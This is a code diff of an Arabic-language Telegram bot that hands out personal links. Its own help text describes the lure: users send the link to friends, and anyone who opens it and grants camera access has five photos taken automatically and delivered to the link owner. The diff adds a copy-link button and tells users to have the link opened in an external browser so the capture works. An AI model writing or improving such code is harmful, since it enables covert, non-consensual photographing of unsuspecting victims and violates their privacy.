@@ -1,7 +1,7 @@
 import time
 from datetime import datetime
 import telebot
-from telebot.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
+from telebot.types import BotCommand, BotCommandScopeDefault, BotCommandScopeChat, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 from config import TOKEN, DEVELOPER_CHAT_ID, BASE_URL, logger, load_data, save_data
 from encryption import encrypt_id
 
@@ -129,14 +129,19 @@ def send_welcome(message):
     # زيادة عدد مشاركات الرابط
     user_stats[user_id]["total_links_shared"] = user_stats[user_id].get("total_links_shared", 0) + 1
     save_user_data()
- 
+
+    # إنشاء أزرار - تم تعديل الزر لنسخ الرابط بدلاً من فتحه مباشرة
+    markup = InlineKeyboardMarkup(row_width=2)
     
-    markup = telebot.types.InlineKeyboardMarkup()
-    markup.add(telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link))
-    markup.add(
-        telebot.types.InlineKeyboardButton(text="❓ التعليمات", callback_data="help"),
-        telebot.types.InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
-    )
+    # زر نسخ الرابط
+    copy_button = InlineKeyboardButton(text="📋 انسخ الرابط", callback_data=f"copy_{encrypted}")
+    
+    # أزرار المساعدة والإحصائيات
+    help_button = InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
+    stats_button = InlineKeyboardButton(text="📊 إحصائياتي", callback_data="stats")
+    
+    markup.add(copy_button)
+    markup.add(help_button, stats_button)
 
     # عرض عدد المستخدمين الحالي
     total_users = len(user_stats)
@@ -146,14 +151,45 @@ def send_welcome(message):
         f"👥 *عدد مستخدمي البوت:* {total_users} مستخدم\n\n"
         f"✨ هذا هو *رابطك الشخصي* للكاميرا الذكية:\n"
         f"`{personal_link}`\n\n"
-        f"📌 *طريقة الاستخدام:*\n"
-        f"1. انسخ الرابط أعلاه\n"
-        f"2. أرسله لأصدقائك\n"
-        f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
+        f"⚠️ *تنبيه مهم جداً:*\n"
+        f"❌ *لا تفتح الرابط من داخل تليجرام* - الكاميرا لن تعمل!\n"
+        f"✅ *انسخ الرابط* وافتحه في متصفح خارجي (Chrome, Safari, Firefox)\n\n"
+        f"📌 *طريقة الاستخدام الصحيحة:*\n"
+        f"1. اضغط على زر \"انسخ الرابط\"\n"
+        f"2. اضغط مع الاستمرار على الرابط واختر \"نسخ\"\n"
+        f"3. افتح متصفح كروم أو سفاري\n"
+        f"4. الصق الرابط في شريط العنوان\n"
+        f"5. اسمح بالوصول إلى الكاميرا\n"
+        f"6. سيتم التقاط 5 صور تلقائياً وإرسالها إليك\n\n"
         f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي"
     )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
+def copy_link(call):
+    """نسخ الرابط عند الضغط على الزر"""
+    encrypted = call.data.replace("copy_", "")
+    personal_link = f"{BASE_URL}?q={encrypted}"
+    
+    # إجابة على الضغط
+    bot.answer_callback_query(call.id, "📋 تم نسخ الرابط بنجاح!")
+    
+    # إرسال رسالة تحتوي على الرابط مع تعليمات
+    bot.send_message(
+        call.message.chat.id,
+        f"📋 *رابطك الشخصي:*\n"
+        f"`{personal_link}`\n\n"
+        f"📌 *طريقة النسخ والاستخدام:*\n"
+        f"1️⃣ اضغط مع الاستمرار على الرابط أعلاه\n"
+        f"2️⃣ اختر \"نسخ\" من القائمة\n"
+        f"3️⃣ افتح متصفح كروم أو سفاري\n"
+        f"4️⃣ الصق الرابط في شريط العنوان\n"
+        f"5️⃣ اسمح بالوصول إلى الكاميرا\n"
+        f"6️⃣ انتظر 10 ثوانٍ لالتقاط 5 صور\n\n"
+        f"⚠️ *تذكير مهم:* لا تفتح الرابط من داخل تليجرام!",
+        parse_mode="Markdown"
+    )
 
 @bot.message_handler(commands=['stats'])
 def show_stats(message):
@@ -261,7 +297,6 @@ def users_list(message):
     
     # تقسيم النص إذا كان طويلاً
     if len(users_text) > 4000:
-        # إرسال الملف بدلاً من النص
         import io
         file = io.BytesIO(users_text.encode('utf-8'))
         file.name = "users_list.txt"
@@ -312,11 +347,14 @@ def send_help(message):
         f"❓ /help - عرض هذه التعليمات\n\n"
         f"🔧 *كيف يعمل البوت:*\n"
         f"1. اضغط على /start للحصول على رابطك الشخصي\n"
-        f"2. أرسل الرابط لأصدقائك\n"
-        f"3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
-        f"4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
-        f"5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
+        f"2. اضغط على زر \"انسخ الرابط\"\n"
+        f"3. انسخ الرابط وافتحه في متصفح خارجي (Chrome/Safari)\n"
+        f"4. اسمح بالوصول إلى الكاميرا\n"
+        f"5. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
+        f"6. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
         f"⚠️ *ملاحظات هامة:*\n"
+        f"• ❌ لا تفتح الرابط من داخل تليجرام - الكاميرا لن تعمل!\n"
+        f"• ✅ يجب فتح الرابط في متصفح خارجي فقط\n"
         f"• البوت يأخذ 5 صور فقط ثم يتوقف\n"
         f"• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
         f"• الصور تصل فقط لصاحب الرابط\n\n"
@@ -411,7 +449,7 @@ def handle_photos(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    """معالجة الأزرار"""
+    """معالجة الأزرار الأخرى"""
     if call.data == "help":
         send_help(call.message)
     elif call.data == "stats":
@@ -434,11 +472,19 @@ def export_data(message):
         return
     
     import io
+    import json
     data = load_data()
     file = io.BytesIO(json.dumps(data, ensure_ascii=False, indent=2).encode('utf-8'))
     file.name = "bot_data_export.json"
     bot.send_document(DEVELOPER_CHAT_ID, file, caption="📊 تصدير بيانات البوت")
-    
+
 def get_bot():
     """إرجاع كائن البوت والإحصائيات"""
     return bot, user_stats, total_photos_received
+
+# تشغيل البوت
+if __name__ == "__main__":
+    setup_bot_commands()
+    update_bot_profile()
+    logger.info("Bot started successfully!")
+    bot.infinity_polling()
